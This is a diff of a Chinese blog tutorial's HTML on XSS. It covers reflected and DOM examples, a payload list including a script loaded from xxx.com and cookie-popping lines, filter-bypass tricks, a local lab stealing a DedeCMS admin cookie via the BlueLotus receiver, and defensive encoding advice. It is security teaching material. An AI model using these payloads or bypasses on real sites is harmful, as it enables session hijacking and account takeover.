+<p>这个代码的意思很简单，就是读取一个age的值并将它打印到屏幕上，当我们精心构造特殊值的时候就可以引起反射型XSS攻击，比如这个实例中，我们将age赋值为<code>&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt; </code>，然后再将整个链接发送给被攻击者，通过社工等手段引诱被攻击者点击这个链接就可以实现XSS攻击。</p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108125702703.png" alt="image-20210108125702703"></p>
 <p>看一下网页源代码，发现插入进去的js脚本被完完全全的执行了。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108125859890.png" alt="image-20210108125859890"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108125859890.png" alt="image-20210108125859890"></p>
 <h3 id="3-Dom型XSS"><a href="#3-Dom型XSS" class="headerlink" title="3. Dom型XSS"></a>3. Dom型XSS</h3><h4 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，并不经过后端，DOM型XSS总的来说危害较小，一般也归属于反射型XSS的一种。</p>
 <p>常见的流程是JS代码通过获取页面referer来构造一个img节点来，然后加入到页面DOM树来实现发起一个GET请求，从而实现一个统计访问来源的目的这样一个功能，那么我们就可以通过构造一个网址中带有攻击代码的页面，通过A链接访问存在XSS的目标页面，于是乎当页面的JS在构造那样一个img节点的时候就将带有Payload的代码的来源地址直接构造到页面，于是就导致了DOM 型XSS的产生。</p>
 <blockquote>
 <p>可能触发DOM型XSS的属性</p>
 <p>document.referer、window.name、location、innerHTML、documen.write</p>
-<p>关于Dom的解释：<a href="https://blog.csdn.net/qq_36119192/article/details/82933873" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/82933873</a></p>
+<p>关于Dom的解释：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82933873">https://blog.csdn.net/qq_36119192/article/details/82933873</a></p>
 </blockquote>
 <p>通过上面的解释可以很容易知道Dom型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。</p>
-<h4 id="实例代码-2"><a href="#实例代码-2" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;XSS_test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;DOM型XSS测试&lt;h2&gt;</span><br><span class="line">    &lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; onclick=&apos;loction=&quot;test.php&quot;&apos;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $name=$_POST[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">  var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">  print.innerHTML=text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="实例代码-2"><a href="#实例代码-2" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;XSS_test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;DOM型XSS测试&lt;h2&gt;</span><br><span class="line">    &lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; onclick=&#x27;loction=&quot;test.php&quot;&#x27;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $name=$_POST[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">  var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">  print.innerHTML=text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>发送我们的<code>&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code>，操作标签来执行js。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108150648399.png" alt="image-20210108150648399"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108150648399.png" alt="image-20210108150648399"></p>
 <p><strong>通过上面的流程我们知道了Dom型与其余两种XSS情形的主要区别在于直接插入js代码没有回显，Dom没有页面回显(不会被执行)，我们要利用DOM的特性来操作插入标签这样就js代码就会被执行</strong>，如上文演示的源码，我们利用innerHTML属性插入了一个img标签，再利用标签引起了js的执行。</p>
 <h3 id="4-常用的攻击载荷"><a href="#4-常用的攻击载荷" class="headerlink" title="4.常用的攻击载荷"></a>4.常用的攻击载荷</h3><ul>
 <li><p><code>&lt;script&gt;标签</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">“&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">“&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br></pre></td></tr></table></figure></li>
 <li><p><code>&lt;svg&gt;标签</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;//</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;//</span><br></pre></td></tr></table></figure></li>
 <li><p><code>&lt;img&gt;标签</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br></pre></td></tr></table></figure></li>
 <li><p><code>&lt;body&gt;标签</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw=alert(1)&gt;</span><br></pre></td></tr></table></figure></li>
 <li><p><code>video标签</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure></li>
 <li><p><code>style标签</code></p>
 <p><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</code></p>
 </li>
 <li><p><code>监听键盘onkeydown事件</code></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeydown=funciont(e)&#123;</span><br><span class="line"><span class="keyword">if</span>(!e)e=<span class="built_in">window</span>.event;</span><br><span class="line"><span class="keyword">try</span>(hijack();)<span class="keyword">catch</span>(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeydown=<span class="function"><span class="title">funciont</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!e)e=<span class="built_in">window</span>.event;</span><br><span class="line"><span class="keyword">try</span>(hijack();)<span class="keyword">catch</span>(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p><code>捕获用户输入的特定键</code></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keyDown</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> keycode = event.keyCode;</span><br><span class="line"><span class="keyword">var</span> realkey = <span class="built_in">String</span>.fromCharCode(event.keyCode);</span><br><span class="line">alert(<span class="string">"按键码: "</span> + keycode + <span class="string">" 字符: "</span> + realkey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.onkeydown = keyDown;</span><br><span class="line">&lt;<span class="regexp">/scrip&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-</li>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keyDown</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> keycode = event.keyCode;</span><br><span class="line"><span class="keyword">var</span> realkey = <span class="built_in">String</span>.fromCharCode(event.keyCode);</span><br><span class="line">alert(<span class="string">&quot;按键码: &quot;</span> + keycode + <span class="string">&quot; 字符: &quot;</span> + realkey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.onkeydown = keyDown;</span><br><span class="line">&lt;/scrip&gt;</span><br></pre></td></tr></table></figure></li>
 </ul>
 <h2 id="0x02-XSS实战"><a href="#0x02-XSS实战" class="headerlink" title="0x02 XSS实战"></a>0x02 XSS实战</h2><h4 id="1-本地XSS平台搭建"><a href="#1-本地XSS平台搭建" class="headerlink" title="1. 本地XSS平台搭建"></a>1. 本地XSS平台搭建</h4><p>首先下载清华蓝莲花战队开发的XSS平台<code>https://github.com/trysec/BlueLotus_XSSReceiver</code></p>
 <p>下载后直接拖到上次安装好的phpstudy文件中,访问相应链接开始安装即可。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107185039709.png" alt="image-20210107185039709"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107185039709.png" alt="image-20210107185039709"></p>
 <p>安装完成后进入后台来新建自己的一个项目，插入了一个常见的模板，修改好website的值，为源码所在的文件夹，再修改一行明显的文字作为攻击成功的提示。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107190729950.png" alt="image-20210107190729950"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107190729950.png" alt="image-20210107190729950"></p>
 <p>生成专属的payload</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107191153852.png" alt="image-20210107191153852"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107191153852.png" alt="image-20210107191153852"></p>
 <h4 id="2-利用XSS获取管理员的COOKIE"><a href="#2-利用XSS获取管理员的COOKIE" class="headerlink" title="2. 利用XSS获取管理员的COOKIE"></a>2. 利用XSS获取管理员的COOKIE</h4><p>这次用的是比较经典的织梦建站程序，版本号为DedeCmsV5.6-GBK，下载地址为<code>http://www.dedecms.com/products/dedecms/downloads/</code>，下载后解压，依照上面的安装流程将解压好的程序放入phpstudy的WWW文件夹中，然后安装。</p>
 <p>新建一篇文章，然后评论内容就是我们之前构造的payload。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107212147753.png" alt="image-20210107212147753"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107212147753.png" alt="image-20210107212147753"></p>
 <p>管理员登录后台显示XSS攻击成功。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107215703375.png" alt="image-20210107215703375"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107215703375.png" alt="image-20210107215703375"></p>
 <p>返回我们本地搭建好的xss平台发现已经有了返回信息</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107215828732.png" alt="image-20210107215828732"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107215828732.png" alt="image-20210107215828732"></p>
 <p>至此，XSS攻击成功。</p>
-<h2 id="0x03-XSS危害与防御"><a href="#0x03-XSS危害与防御" class="headerlink" title="0x03 XSS危害与防御"></a>0x03 XSS危害与防御</h2><h4 id="1-XSS利用框架"><a href="#1-XSS利用框架" class="headerlink" title="1. XSS利用框架"></a>1. XSS利用框架</h4><p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108153209725.png" alt="image-20210108153209725"></p>
+<h2 id="0x03-XSS危害与防御"><a href="#0x03-XSS危害与防御" class="headerlink" title="0x03 XSS危害与防御"></a>0x03 XSS危害与防御</h2><h4 id="1-XSS利用框架"><a href="#1-XSS利用框架" class="headerlink" title="1. XSS利用框架"></a>1. XSS利用框架</h4><p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108153209725.png" alt="image-20210108153209725"></p>
 <ul>
 <li><p>挖掘XSS漏洞小技巧：</p>
 <blockquote>
@@ -537,7 +528,7 @@
 <p>2、利用 HTML 标签的属性值进行 XSS 攻击。例如：<code>&lt;img src=“javascript:alert(‘xss’)”/&gt;;</code>（当然并不是所有的 Web 浏览器都支持 Javascript 伪协议，所以此类 XSS 攻击具有一定的局限性）</p>
 <p>3、空格、回车和 Tab。如果 XSS Filter 仅仅将敏感的输入字符列入黑名单，比如 javascript，用户可以利用空格、回车和 Tab 键来绕过过滤，例如：<code>&lt;img src=“javas cript:alert(/xss/);”/&gt;；</code></p>
 <p>4、利用事件来执行跨站脚本。例如：<code>&lt;img src=“#” onerror= “alert(1)”/&gt;</code>，当 src 错误的视乎就会执行 onerror 事件；</p>
-<p>5、利用 CSS 跨站。例如：<code>body {backgrund-image: url(“javascript:alert(‘xss’)”)}</code></p>
+<p>5、利用 CSS 跨站。例如：<code>body &#123;backgrund-image: url(“javascript:alert(‘xss’)”)&#125;</code></p>
 <p>6、扰乱过滤规则。例如：<code>&lt;IMG SRC=“javaSCript: alert(/xss/);”/&gt;</code></p>
 <p>7、利用字符编码，通过这种技巧，不仅能让 XSS 代码绕过服务端的过滤，还能更好地隐藏 Shellcode；（ JS 支持 unicode、eacapes、十六进制、十进制等编码形式）；</p>
 <p>8、拆分跨站法，将 XSS 攻击的代码拆分开来，适用于应用程序没有过滤 XSS 关键字符（如&lt;、&gt;）却对输入字符长度有限制的情况下；</p>
@@ -554,7 +545,7 @@
 <li>内网渗透（端口扫描、ST2利用、路由器）</li>
 <li>键盘记录、rootkit、蠕虫攻击、水坑、钓鱼、劫持…</li>
 </ul>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108153631445.png" alt="image-20210108153631445"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108153631445.png" alt="image-20210108153631445"></p>
 <h4 id="3-XSS的防御"><a href="#3-XSS的防御" class="headerlink" title="3. XSS的防御"></a>3. XSS的防御</h4><p>通过对上面内容进行学习，容易知道主要前端页面完全信任了用户输入的数据导致了XSS漏洞出现，所以我们可以在前端加上过滤代码、转义代码。如将<code>\</code>转义成为<code>\\</code>将<code>/</code>转义成为<code>\/</code>将<code>;</code>转义成为中文<code>；</code>。</p>
 <blockquote>
 <p>注意：在对不可信数据做编码的时候，不能图方便使用反斜杠<code>\</code> 对特殊字符进行简单转义，比如将双引号 <code>”</code>转义成 <code>\”</code>，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击；另外，输出的变量的时候，变量值必须在引号内部，避免安全问题；更加严格的方式，对除了数字和字母以外的所有字符，使用十六进制\xhh 的方式进行编码。</p>
@@ -572,17 +563,17 @@
 </li>
 <li><p>html实体编码</p>
 <p>当需要往 HTML 标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行 HTML Entity 编码，在html中有些字符对于HTML来说是具有特殊意义的，所以这些特殊字符不允许在文本中直接使用，需要使用实体字符。 html 实体的存在是导致 XSS 漏洞的主要原因之一，因此我们需要将实体转化为相应的实体编号。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108155930639.png" alt="image-20210108155930639"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108155930639.png" alt="image-20210108155930639"></p>
 </li>
 </ol>
 <h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ul>
-<li><a href="https://blog.csdn.net/qq_35393693/article/details/86597707" target="_blank" rel="noopener">https://blog.csdn.net/qq_35393693/article/details/86597707</a></li>
-<li><a href="https://mp.weixin.qq.com/s/CvCdk9NdAA4WGGnTNRVRWQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CvCdk9NdAA4WGGnTNRVRWQ</a></li>
-<li><a href="https://my.oschina.net/u/4610683/blog/4484162" target="_blank" rel="noopener">https://my.oschina.net/u/4610683/blog/4484162</a></li>
-<li><a href="https://www.cnblogs.com/yuzly/p/11369819.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11369819.html</a></li>
-<li><a href="https://my.oschina.net/u/4593189/blog/4418296" target="_blank" rel="noopener">https://my.oschina.net/u/4593189/blog/4418296</a></li>
-<li><a href="https://pockr.org/blogs/act_033515273cc468fe12" target="_blank" rel="noopener">https://pockr.org/blogs/act_033515273cc468fe12</a></li>
-<li><a href="https://pockr.org/blogs/act_6e5e0dc2360fbe1569" target="_blank" rel="noopener">https://pockr.org/blogs/act_6e5e0dc2360fbe1569</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35393693/article/details/86597707">https://blog.csdn.net/qq_35393693/article/details/86597707</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CvCdk9NdAA4WGGnTNRVRWQ">https://mp.weixin.qq.com/s/CvCdk9NdAA4WGGnTNRVRWQ</a></li>
+<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4610683/blog/4484162">https://my.oschina.net/u/4610683/blog/4484162</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11369819.html">https://www.cnblogs.com/yuzly/p/11369819.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4593189/blog/4418296">https://my.oschina.net/u/4593189/blog/4418296</a></li>
+<li><a target="_blank" rel="noopener" href="https://pockr.org/blogs/act_033515273cc468fe12">https://pockr.org/blogs/act_033515273cc468fe12</a></li>
+<li><a target="_blank" rel="noopener" href="https://pockr.org/blogs/act_6e5e0dc2360fbe1569">https://pockr.org/blogs/act_6e5e0dc2360fbe1569</a></li>
 </ul>
 
       
@@ -604,7 +595,7 @@
   </li>
 <li class="post-copyright-link">
   <strong>本文链接：</strong>
-  <a href="http://bu1.github.io/2021/01/12/第十二周：XSS漏洞学习实战/" title="第十二周：XSS漏洞学习实战">http://bu1.github.io/2021/01/12/第十二周：XSS漏洞学习实战/</a>
+  <a target="_blank" rel="noopener" href="http://bu1.github.io/2021/01/12/第十二周：XSS漏洞学习实战/" title="第十二周：XSS漏洞学习实战">http://bu1.github.io/2021/01/12/第十二周：XSS漏洞学习实战/</a>
 </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -634,7 +625,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/01/06/第十一周：手工测试之前编写的注入环境/" rel="next" title="第十一周：手工测试之前编写的注入环境">
+              <a href="/2021/01/06/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%89%8D%E7%BC%96%E5%86%99%E7%9A%84%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/" rel="next" title="第十一周：手工测试之前编写的注入环境">
                 <i class="fa fa-chevron-left"></i> 第十一周：手工测试之前编写的注入环境
               </a>
             
@@ -644,7 +635,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2021/01/14/第十三周：SSRF漏洞学习实战/" rel="prev" title="第十三周：SSRF漏洞学习实战">
+              <a href="/2021/01/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/" rel="prev" title="第十三周：SSRF漏洞学习实战">
                 第十三周：SSRF漏洞学习实战 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -686,7 +677,7 @@
       <div id="disqus_thread">
         <noscript>
           Please enable JavaScript to view the
-          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+          <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
         </noscript>
       </div>
     </div>
@@ -728,10 +719,12 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Bu1">
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="" />
             
-              <p class="site-author-name" itemprop="name">Bu1</p>
-              <p class="site-description motion-element" itemprop="description">最为惊艳的是思想碰撞产生的火花。</p>
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
           <nav class="site-state motion-element">
@@ -739,7 +732,7 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%20%7C%7C%20archive">
               
                   <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
@@ -805,7 +798,7 @@
             
 
             
